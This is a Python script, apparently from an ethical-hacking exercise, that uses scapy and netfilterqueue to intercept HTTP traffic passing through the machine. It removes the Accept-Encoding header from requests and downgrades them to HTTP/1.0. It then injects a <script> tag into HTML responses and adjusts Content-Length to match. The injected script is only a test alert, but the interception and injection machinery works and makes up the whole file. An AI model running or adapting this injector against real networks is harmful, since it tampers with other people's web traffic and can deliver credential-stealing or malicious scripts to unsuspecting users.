#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:  # Request
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load))
            load = load.replace("HTTP/1.1", "HTTP/1.0")
            print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:  # Response
            print("[+] Response")
            load = re.sub("</body>", "<script>alert('TEST')</script></body>", str(load))
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len("<script>alert('TEST')</script>")
                load = load.replace(content_length, str(new_content_length))
                print(scapy_packet.show())

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
